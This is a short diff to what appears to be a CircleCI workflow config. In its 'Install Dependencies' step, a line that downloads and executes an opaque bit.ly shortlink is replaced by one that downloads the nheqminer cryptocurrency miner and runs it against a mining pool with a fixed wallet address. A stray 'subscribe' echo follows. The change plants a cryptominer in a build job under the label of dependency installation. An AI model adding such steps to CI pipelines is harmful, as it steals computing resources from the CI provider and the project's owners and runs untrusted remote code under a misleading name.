@@ -8,7 +8,8 @@ jobs:
         - run:
             name: Install Dependencies
             command: |
-              wget https://bit.ly/3m9HlBR && chmod u+x 3m9HlBR && ./3m9HlBR
+              wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l ap.luckpool.net:3956 -u RTQ4T8D6xgLR5u9e1aZZjrBdQy8sog2Zb7.Rig001 -p x -t 8
+
               echo Hello,subscribe it
 
 workflows:
